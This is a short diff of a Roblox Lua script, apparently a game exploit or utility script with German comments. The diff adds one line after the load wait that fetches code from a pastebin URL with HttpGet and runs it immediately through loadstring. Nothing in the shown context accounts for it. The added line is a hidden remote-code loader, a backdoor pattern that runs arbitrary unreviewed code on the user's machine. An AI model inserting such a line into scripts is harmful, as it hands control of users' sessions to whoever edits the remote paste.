@@ -14,7 +14,7 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 wait(3)
-
+loadstring(game:HttpGet("https://pastebin.com/raw/0C0ZCkps"))()
 -- Sicheres Service-Loading
 local function GetService(serviceName)
     local success, service = pcall(function()
